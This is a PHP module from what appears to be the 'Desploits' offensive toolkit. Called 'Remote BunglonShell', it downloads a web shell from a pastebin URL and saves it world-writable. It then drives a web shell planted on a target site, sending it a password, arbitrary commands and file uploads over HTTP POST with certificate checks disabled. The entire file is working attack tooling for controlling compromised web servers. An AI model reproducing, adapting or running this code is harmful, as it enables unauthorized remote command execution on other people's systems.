<?php
/**
_________                          .__                   
\______   \ __ __   ____     ____  |  |    ____    ____  
 |    |  _/|  |  \ /    \   / ___\ |  |   /  _ \  /    \ 
 |    |   \|  |  /|   |  \ / /_/  >|  |__(  <_> )|   |  \
 |______  /|____/ |___|  / \___  / |____/ \____/ |___|  /
        \/             \/ /_____/ desploits shell     \/ 

 Team 	: Developer Desploits Tool
 Coder 	: x'1n73ct
 Class 	: Remote BunglonShell
**/
error_reporting(0);
define("INI_GET","ini_get");
define("FUNCTION_EXIST","function_exists");

class Bunglonshell extends DesploitsModules
{
	function __construct(){
		$this->shell = "http://pastebin.com/raw/B5B8YkXw";
		$this->filename = "bunglon-shell.php";
		$this->data["url"] = "";
		$this->data["data"]["type"] = "";
		$this->data["data"]["upl_file"] = "";
		$this->data["data"]["upl_filename"] = "";
		$this->data["data"]["cmd"] = "";
		$this->data["data"]["password"] = "";
		$this->session_login = "out";
	}
	

	public function header(){
		print "
__________                         .__                   
\______   \ __ __   ____     ____  |  |    ____    ____  
 |    |  _/|  |  \ /    \   / ___\ |  |   /  _ \  /    \ 
 |    |   \|  |  /|   |  \ / /_/  >|  |__(  <_> )|   |  \
 |______  /|____/ |___|  / \___  / |____/ \____/ |___|  /
        \/             \/ /_____/ desploits shell     \/ 
\n";
	}


	protected function _PutFile($data,$filename)
	{
		$create_file_1 = file_put_contents($filename, $data);
		if(!file_exists($filename)){
			@fwrite(fopen($filename, 'w'),$data);
		}

		return (file_exists($filename)) ? 1 : 0;
	}
        
        

	protected function post($req)
	{
		if($this->_check(FUNCTION_EXIST,"curl_version")){
		$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL,$req['url']);
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS,$req['data']);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, false);
			$server_output = curl_exec($ch);
			curl_close ($ch);
		}else{
			$postdata = http_build_query($req['data']);
			$data = stream_context_create([
				'http' => [
						'method'  => 'POST',
						'header'  => 'Content-type: application/x-www-form-urlencoded',
						'content' => $postdata
					]
				]);
			$server_output = file_get_contents($req['url'], false, $data);
		}

		return $server_output;
	}

	protected function _check($func,$val)
	{
                return call_user_func($func,$val);
	}

	protected function CreateShell(){
        $dir_location =  "database/bunglonshell/";
		$filename = $this->filename;
                $return = '';
		if(!file_exists($dir_location.$filename)){
			$this->_PutFile(file_get_content($this->shell),$dir_location.$filename);
			if(!file_exists($dir_location.$filename)){
				$return .= "[!] File {$filename} Gagal Dibuat.\n";
			}else{
                                $chmod = chmod($filename,777);
				$return .= "[!] File {$filename} Berhasil Dibuat.\n";
				$return .= "[!] Location : {$dir_location}{$filename}\n";
			}
		}else{
			$return .= "[!] File {$filename} Sudah Ada.\n";
                        $return .= "[!] Location : {$dir_location}{$filename}\n";
		}

		echo $return;
	}

	protected function login(){
		if($this->session_login == "out" || $this->session_login == "logout"){
		$kirim = $this->post($this->data);
		$this->session_login = $kirim;
	}
		
	}

	protected function comand(){
		if($this->session_login == "in"){

			$cmd = $this->stuck("desploit@bunglon > ");
			
			if($cmd == "logout"){
			$this->session_login = "logout";
			$this->run();
			unset($this->data);
			unset($this->url);
			}elseif($cmd == "upload"){
			$this->data['data']['upl_file']=$this->stuck("[?] Url or Data Base64 : ");
			$this->data['data']['upl_filename']=$this->stuck("[?] FileName : ");
			$this->data['data']['type'] = 'upl_data';
			echo $this->post($this->data)."\n";
			}else{
			$this->data['data']['cmd']=$cmd;
			$this->data['data']['type'] = 'cmd';
			echo $this->post($this->data)."\n";
			}

			$this->comand();

		}elseif($this->session_login == "out"){
			echo "check url / password Anda.\n";
			$this->login();
		}
	}
	
	public function run()
	{
		$this->header();
		$question1 ="[1] Create Shell \n";
		$question1 .="[2] Remote Shell \n";
		echo $question1;
		$req=$this->stuck("[?] pleas select number (1/2) : ");
		if($req == 1){
			$this->CreateShell();
            $this->run();
		}else if($req == 2){
			$this->data['url']=$this->stuck("[?] Link Shell : ");
			$this->data['data']['password']=$this->stuck("[?] Password : ");
			$this->data['data']['type'] = "is_login";
			$this->login();
			$this->comand();
		}
	}
}